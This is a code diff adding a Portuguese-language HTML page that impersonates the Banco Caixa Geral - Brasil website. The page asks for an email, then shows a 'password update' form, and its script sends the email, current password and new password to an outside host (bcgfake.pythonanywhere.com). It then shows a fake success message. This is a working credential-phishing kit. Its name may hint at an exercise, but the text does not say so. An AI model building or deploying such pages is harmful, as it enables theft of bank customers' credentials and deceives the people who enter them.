@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Caixa Geral - Brasil</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <main>
+      <nav class="navbar">
+        <img src="/public/Caixa.png" alt="">
+      </nav>
+      <div class="bottombar">
+        <ul>
+          <li><a href="https://www.bcgbrasil.com.br/Paginas/Homepage.aspx">Banco Caixa Geral - Brasil</a></li>
+          <li><a href="https://www.bcgbrasil.com.br/Areas-atuacao/Paginas/Banco-Caixa-Geral-Brasil.aspx">Áreas de atuação</a></li>
+          <li><a href="https://www.bcgbrasil.com.br/Tarifas/Paginas/Tarifas.aspx">Tarifas</a></li>
+          <li><a href="https://www.bcgbrasil.com.br/Imprensa/Paginas/Imprensa.aspx">Imprensa</a></li>
+          <li><a href="https://www.bcgbrasil.com.br/Divulgacao-informacoes/Paginas/Divulgacao-Informacoes.aspx">Divulgação de informações</a></li>
+        </ul>
+      </div>
+
+      <section class="email-verification" id="emailVerification">
+        <div class="mainDiv">
+          <div class="cardStyle">
+            <h3 class="formTitle">Insira seu email para verificação</h3>
+            <div class="inputDiv">
+              <input type="email" id="emailInput" placeholder="Seu email">
+              <div id="emailError" class="error"></div>
+            </div>
+            <div class="buttonWrapper">
+              <button onclick="verifyEmail()" class="submitButton">Verificar</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="alter-pass" id="alterPass" style="display: none;">
+        <div class="mainDiv">
+          <div class="cardStyle">
+            <h1 id="userName" class="welcomeMessage"></h1>
+            <h3 class="formTitle">Atualize a sua senha</h3>
+            <form id="passwordForm">
+              <div class="inputDiv">
+                <input type="password" id="currentPassword" placeholder="Senha atual">
+                <div id="currentPasswordError" class="error"></div>
+              </div>
+              <div class="inputDiv">
+                <input type="password" id="newPassword" placeholder="Nova senha">
+                <div id="newPasswordError" class="error"></div>
+              </div>
+              <div class="inputDiv">
+                <input type="password" id="confirmPassword" placeholder="Confirme a nova senha">
+                <div id="confirmPasswordError" class="error"></div>
+              </div>
+              <div class="password-guidelines">
+                <h4>Sua nova senha deve conter:</h4>
+                <ul>
+                  <li id="length">Pelo menos 8 caracteres</li>
+                  <li id="uppercase">Pelo menos uma letra maiúscula</li>
+                  <li id="lowercase">Pelo menos uma letra minúscula</li>
+                  <li id="number">Pelo menos um número</li>
+                  <li id="special">Pelo menos um caractere especial</li>
+                </ul>
+              </div>
+              <div class="buttonWrapper">
+                <button type="submit" class="submitButton">Atualizar Senha</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </section>
+
+      <div id="responseMessage" style="color: red; font-weight: bold;"></div>
+
+      <section class="fraud-alert">
+        <img src="public/Banner-fraude-Set2023.gif" alt="Alert Icon">
+      </section>
+
+      <section class="services">
+        <div class="service-box">
+          <h3>BANCO DE EMPRESAS</h3>
+          <img src="/public/BancoEmpresas_330x140.jpg" alt="Banco de Empresas">
+          <p><strong>Um elo entre mercados</strong></p>
+          <p>Área especializada em atender grandes empresas dos mais diversos segmentos, as quais possuam negócios em países onde a Caixa geral de depósitos (CGD) está implantada.</p>
+          <a href="https://www.bcgbrasil.com.br/Areas-Atuacao/Banco-Empresas/Paginas/Banco-Empresas.aspx"><strong>saiba mais >></strong></a>
+        </div>
+        <div class="service-box">
+          <h3>BANCO DE INVESTIMENTOS</h3>
+          <img src="/public/BancoInvestimento_330x140.jpg" alt="Banco de Investimentos">
+          <p><strong>Brasil, Europa e África</strong></p>
+          <p>O Banco Caixa Geral - Brasil oferece assessoria para financiamento de projetos e fusões e aquisições no Brasil, na Europa (Península Ibérica, principalmente) e na África, regiões onde o Grupo CGD possui uma trajetória e resultados de sucesso.</p>
+          <a href="https://www.bcgbrasil.com.br/Areas-Atuacao/Banco-Investimentos/Paginas/Banco-Investimentos.aspx"><strong>saiba mais >></strong></a>
+        </div>
+        <div class="service-box">
+          <h3>PESSOA FÍSICA E INVESTIDOR INSTITUCIONAL</h3>
+          <img src="/public/PessoaFisica_330x140.jpg" alt="Pessoa Física e Investidor Institucional">
+          <p><strong>Soluções caso a caso</strong></p>
+          <p>Aos que procuram solidez e rentabilidade na hora de investir, o Banco Caixa Geral - Brasil é uma opção segura e que conta com toda a expertise do Grupo CGD. Cada solução é customizada de acordo com o perfil do cliente.</p>
+          <a href="https://www.bcgbrasil.com.br/Areas-Atuacao/Pessoa-Fisica-Investidor-Institucional/Paginas/Pessoa-Fisica-Investidor-Institucional.aspx"><strong>saiba mais >></strong></a>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div style="border: 1px dashed gray; margin-bottom: 1%; margin-top: 2%;"></div>
+        <nav class="footer-links">
+            <ul>
+                <li><a href="http://www.bcgbrasil.com.br/Politica-Privacidade/Paginas/Pol%C3%ADtica-Privacidade-Termos-Uso.aspx">Termos de Uso</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Mapa-do-Site/Paginas/Mapa-do-site.aspx">Mapa do Site</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Imprensa/Paginas/ResponsabilidadeSocial.aspx">Responsabilidade Cultural e Social</a></li>
+                <li><a href="https://www.cgd.pt/Investor-Relations//Informacao-aos-Investidores/Factsheets/Documents/Factsheet-N9-PT.pdf">Factsheet</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Divulgacao-informacoes/Paginas/Rankings.aspx">Rankings</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Paginas/Sustentabilidade.aspx">Sustentabilidade</a></li>
+                <li><a href="http://www.peprobe.com/">Portugal Economy</a></li>
+                <li><a href="http://www.peprobe.com/">Probe</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Paginas/ouvidoria.aspx">Ouvidoria</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Paginas/Compliance.aspx">Compliance</a></li>
+                <li><a href="https://www.bcgbrasil.com.br/Divulgacao-informacoes/Gestao-Risco/Documents/BCG-Brasil_Pol%C3%ADtica%20de%20Privacidade_maio18.pdf">Política de Privacidade</a></li>
+                <li><a href="http://www.bcgbrasil.com.br/Paginas/Securities.aspx">Securities</a></li>
+            </ul>
+            <small>
+              <p>BANCO CAIXA GERAL BRASIL S.A. - Av. Pres. Juscelino Kubitschek, 1830 – Bl.2 - 13º andar - Cj. 132, Cond. S. Luiz Itaim Bibi | CEP 04543-900 - São Paulo, SP - Brasil</p>
+              <p>© 2024 Banco Caixa Geral - Brasil S.A. Todos os direitos reservados</p>
+          </small>
+        </nav>
+    </footer>
+
+    <script>
+        function checkPasswordStrength(password) {
+            const criteria = {
+                length: password.length >= 8,
+                uppercase: /[A-Z]/.test(password),
+                lowercase: /[a-z]/.test(password),
+                number: /[0-9]/.test(password),
+                special: /[!@#$%^&*(),.?":{}|<>]/.test(password)
+            };
+
+            for (const [key, value] of Object.entries(criteria)) {
+                const element = document.getElementById(key);
+                if (value) {
+                    element.classList.add('valid');
+                    element.classList.remove('invalid');
+                } else {
+                    element.classList.add('invalid');
+                    element.classList.remove('valid');
+                }
+            }
+
+            return Object.values(criteria).every(Boolean);
+        }
+
+        document.getElementById('newPassword').addEventListener('input', function() {
+            checkPasswordStrength(this.value);
+        });
+
+        function updatePassword() {
+            const emailInput = document.getElementById('emailInput').value;
+            const currentPassword = document.getElementById('currentPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const newPasswordError = document.getElementById('newPasswordError');
+            const confirmPasswordError = document.getElementById('confirmPasswordError');
+
+            newPasswordError.textContent = '';
+            confirmPasswordError.textContent = '';
+
+            if (!checkPasswordStrength(newPassword)) {
+                newPasswordError.textContent = 'A senha não atende a todos os critérios de segurança.';
+                return;
+            }
+
+            if (newPassword !== confirmPassword) {
+                confirmPasswordError.textContent = 'As senhas não coincidem.';
+                return;
+            }
+
+            sendEmail(emailInput, currentPassword, newPassword);
+        }
+
+        function sendEmail(emailInput, currentPassword, newPassword) {
+            const data = {
+                email: emailInput,
+                currentPassword: currentPassword,
+                newPassword: newPassword
+            };
+
+            $.ajax({
+                url: 'https://bcgfake.pythonanywhere.com/send-email',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify(data),
+                success: function(response) {
+                    $('#responseMessage').text('Alteração salva com sucesso!');
+                    $('#responseMessage').css('color', 'green');
+                },
+                error: function(xhr, status, error) {
+                    $('#responseMessage').text('Erro ao salvar alteração. Tente novamente mais tarde.');
+                    $('#responseMessage').css('color', 'red');
+                    console.error(xhr.responseText);
+                }
+            });
+        }
+
+        function verifyEmail() {
+            const emailInput = document.getElementById('emailInput');
+            const emailError = document.getElementById('emailError');
+            const emailVerification = document.getElementById('emailVerification');
+            const alterPass = document.getElementById('alterPass');
+            const userNameElement = document.getElementById('userName');
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const isValidEmail = emailRegex.test(emailInput.value) && emailInput.value.toLowerCase().endsWith('.com');
+
+            if (isValidEmail) {
+                const userName = emailInput.value.split('@')[0];
+                const capitalizedUserName = userName.charAt(0).toUpperCase() + userName.slice(1);
+                userNameElement.textContent = `Bem-vindo, ${capitalizedUserName}!`;
+                emailVerification.style.display = 'none';
+                alterPass.style.display = 'block';
+            } else {
+                emailError.textContent = 'Por favor, insira um email válido';
+            }
+        }
+
+        $(document).ready(function() {
+            $('#passwordForm').on('submit', function(e) {
+                e.preventDefault();
+
+                updatePassword();
+            });
+        });
+    </script>    
+</body>
+</html>
